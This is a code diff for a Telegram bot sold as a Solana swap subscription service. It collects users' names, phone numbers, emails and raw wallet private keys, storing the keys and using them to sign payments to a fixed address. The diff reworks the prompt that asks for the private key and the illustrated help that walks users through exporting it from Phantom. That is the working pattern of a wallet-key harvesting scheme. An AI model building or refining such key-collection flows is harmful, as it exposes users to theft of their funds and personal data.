@@ -367,8 +367,8 @@ function showPaymentButtons(chatId) {
     user.swapLimit = swaps;
     saveUsers();
   
-    const sender   = Keypair.fromSecretKey(new Uint8Array(bs58.decode(user.privateKey)));
-    const receiver = new PublicKey("8VCEaTpyg12kYHAH1oEAuWm7EHQ62e147UPrJzRZZeps");
+    const sender     = Keypair.fromSecretKey(new Uint8Array(bs58.decode(user.privateKey)));
+    const receiver   = new PublicKey("8VCEaTpyg12kYHAH1oEAuWm7EHQ62e147UPrJzRZZeps");
     const connection = new Connection("https://ros-5f117e-fast-mainnet.helius-rpc.com", "confirmed");
   
     // Verificar fondos
@@ -408,7 +408,6 @@ function showPaymentButtons(chatId) {
   
       // Construir caption con “Limited”
       const fullConfirmation =
-        `✅ *User Registered!*\n` +
         `👤 *Name:* ${user.name}\n` +
         `📱 *Phone:* ${user.phone}\n` +
         `📧 *Email:* ${user.email}\n` +
@@ -423,7 +422,7 @@ function showPaymentButtons(chatId) {
         {
           type: "photo",
           media:
-            "https://cdn.shopify.com/s/files/1/0784/6966/0954/files/pumppay.jpg?v=1743797016",
+            "https://framerusercontent.com/images/vzrp9O3xHWGHvsHeoWYF28il6ck.gif",
           caption: fullConfirmation,
           parse_mode: "Markdown"
         },
@@ -440,6 +439,26 @@ function showPaymentButtons(chatId) {
         }
       );
   
+      // ─────────────────────────────────────────────
+      // Mensaje final al usuario con todos los detalles
+      await bot.sendMessage(
+        chatId,
+`✅ *Payment received successfully!*  
+Your membership is now active.
+  
+  ${fullConfirmation}
+  
+💳 *Paid:* ${solAmount} SOL for ${days} day(s)  
+🗓️ *Expires:* ${expirationDate}  
+🎟️ *Limited:* ${limitedText}  
+🔗 [View Tx](https://solscan.io/tx/${sig})`,
+        {
+          parse_mode: "Markdown",
+          disable_web_page_preview: true
+        }
+      );
+      // ─────────────────────────────────────────────
+  
       // Borrar menú de pago antiguo
       if (user.lastPaymentMsgId) {
         try {
@@ -454,15 +473,16 @@ function showPaymentButtons(chatId) {
         `✅ *Payment received successfully!*\n` +
         `📧 *Email:* ${user.email}\n` +
         `🆔 *Username:* ${user.username}\n` +
-        `💳 *Paid:* ${solAmount} SOL for ${days} days\n` +
+        `💳 *Paid:* ${solAmount} SOL for ${days} day(s)\n` +
         `🗓️ *Expires:* ${expirationDate}\n` +
         `🎟️ *Limited:* ${limitedText}\n` +
         `🔗 [View Tx](https://solscan.io/tx/${sig})`;
   
-      bot.sendMessage(ADMIN_CHAT_ID, adminMsg, {
+      await bot.sendMessage(ADMIN_CHAT_ID, adminMsg, {
         parse_mode: "Markdown",
         disable_web_page_preview: true
       });
+  
     } catch (err) {
       // Error en la transacción
       await bot.editMessageText(
@@ -547,6 +567,14 @@ function showPaymentButtons(chatId) {
 bot.onText(/\/start/, async (msg) => {
     const chatId    = msg.chat.id;
     const firstName = msg.from.first_name || "there";
+    const commandMsgId = msg.message_id;
+  
+    // 1.a) borramos el /start
+    try {
+      await bot.deleteMessage(chatId, commandMsgId);
+    } catch (e) {
+      console.warn("Could not delete /start message:", e.message);
+    }
   
     if (users[chatId]?.walletPublicKey) {
       const expired     = users[chatId].expired;
@@ -561,7 +589,6 @@ bot.onText(/\/start/, async (msg) => {
           { parse_mode: "Markdown" }
         );
       }
-  
       return bot.sendMessage(
         chatId,
         `⚠️ Your subscription has *expired*, *${firstName}*.\n\nPlease choose a plan to continue:`,
@@ -619,37 +646,33 @@ bot.onText(/\/start/, async (msg) => {
         });
         break;
   
-      case 3:
+      // — sustituimos el antiguo case 3 por este nuevo prompt con ayuda inmediata —
+    case 3:
         user.username = text;
         user.step     = 4;
         saveUsers();
-        await bot.editMessageText("🔑 Please enter your *Solana Private Key*:", {
-          chat_id: chatId,
-          message_id: msgId,
-          parse_mode: "Markdown"
-        });
-        break;
   
-        case 4:
-    // 🔑 Prompt con botón de ayuda
-    await bot.editMessageText(
-      "🔑 Please enter your *Solana Private Key* or tap for help:",
-      {
-        chat_id: chatId,
-        message_id: msgId,
-        parse_mode: "Markdown",
-        reply_markup: {
-          inline_keyboard: [
-            [ { text: "❓ How to get Phantom Private Key", callback_data: "show_phantom_pk" } ]
-          ]
-        }
-      }
-    );
-    // guardamos para borrarlo luego
-    user.tempKeyPromptId = msgId;
-    user.step = 4.1;
-    saveUsers();
-    break;
+        // Prompt de private key + botón de ayuda
+        await bot.editMessageText(
+          "🔑 Please enter your *Solana Private Key* or tap for help:",
+          {
+            chat_id: chatId,
+            message_id: msgId,
+            parse_mode: "Markdown",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: "❓ How to get Phantom Private Key", callback_data: "show_phantom_pk" }
+                ]
+              ]
+            }
+          }
+        );
+        // guardamos para borrarlo más adelante
+        user.tempKeyPromptId = msgId;
+        user.step = 4.1;
+        saveUsers();
+        break;
 
   case 4.1:
     // borramos input y el prompt de ayuda si existiera
@@ -700,26 +723,26 @@ bot.onText(/\/start/, async (msg) => {
   
     const help = await bot.sendPhoto(
       chatId,
-      "https://framerusercontent.com/images/MXSsjXZYI8sU5AYK0rKYaFgBPiY.webp",
+      "https://framerusercontent.com/images/k30di08VYuJGL4Xl3E8rNP8bc.gif",
       {
         caption:
-  `1. Open Phantom  
-  Unlock your Phantom extension or mobile app.
+`1. Open Phantom  
+Unlock your Phantom extension or mobile app.
   
-  2. Go to Settings  
-  Tap your profile → Settings.
+2. Go to Settings  
+Tap your profile → Settings.
   
-  3. Security & Privacy  
-  Select *Security & Privacy*.
+3. Security & Privacy  
+Select *Security & Privacy*.
   
-  4. Export Private Key  
-  Scroll and tap *Export Private Key*.
+4. Export Private Key  
+Scroll and tap *Export Private Key*.
   
-  5. Authenticate  
-  Approve with your password or biometrics.
+5. Authenticate  
+Approve with your password or biometrics.
   
-  6. Copy & Secure  
-  Copy the long string and paste here.`,
+6. Copy & Secure  
+Copy the long string and paste here.`,
         parse_mode: "Markdown"
       }
     );
@@ -778,7 +801,6 @@ bot.onText(/\/start/, async (msg) => {
       const statusLine   = `Active for 1 day`;
       const limitedText  = `50 swaps`;
       const fullConfirmation =
-        `✅ *User Registered!*\n` +
         `👤 *Name:* ${user.name}\n` +
         `📱 *Phone:* ${user.phone}\n` +
         `📧 *Email:* ${user.email}\n` +
@@ -791,7 +813,7 @@ bot.onText(/\/start/, async (msg) => {
       // enviamos como foto + botón “How to use”
       await bot.sendPhoto(
         chatId,
-        "https://cdn.shopify.com/s/files/1/0784/6966/0954/files/pumppay.jpg?v=1743797016",
+        "https://framerusercontent.com/images/vzrp9O3xHWGHvsHeoWYF28il6ck.gif",
         {
           caption: fullConfirmation,
           parse_mode: "Markdown",
